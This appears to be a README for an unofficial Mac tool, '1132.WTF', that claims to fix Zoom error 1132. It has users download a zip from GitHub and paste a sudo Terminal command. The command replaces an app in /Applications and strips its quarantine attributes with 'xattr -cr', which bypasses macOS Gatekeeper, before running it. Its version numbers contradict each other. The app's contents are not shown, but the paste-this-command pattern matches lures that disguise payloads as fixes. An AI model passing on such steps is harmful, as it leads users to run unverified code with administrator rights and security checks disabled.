1132.WTF 1.0.9 — Mac only
=========================

The Zoom app on this Mac is what shows error 1132.
LAUNCH joins as a new guest in a private browser window instead.

The first screen MUST say 1132.WTF 1.0.9.
If it does not, you still have the old app.

Delete the old zip first (same filename every time). Download:

https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-macos-1.0.0.zip

Double-click the zip. Then:

STEP 1 - Press Cmd + Space. Type Terminal. Press Return.
         Paste this one line. Type your Mac password. Press Return.

sudo rm -rf /Applications/1132.WTF.app && sudo cp -R "$HOME/Downloads/1132.WTF-macos-1.0.0/1132.WTF.app" /Applications/1132.WTF.app && sudo chown -R "$(whoami):staff" /Applications/1132.WTF.app && xattr -cr /Applications/1132.WTF.app && open /Applications/1132.WTF.app

STEP 2 - The list title must say 1132.WTF 1.0.9.
         Click STEP 1 - Fix Zoom.
         Type Guest. Type the meeting number. Click LAUNCH.

LAUNCH - A private window opens. Click Join from your browser.
         Do not click Open Zoom app. Do not sign in as the old account.
         Nothing to write down. No profile switch.
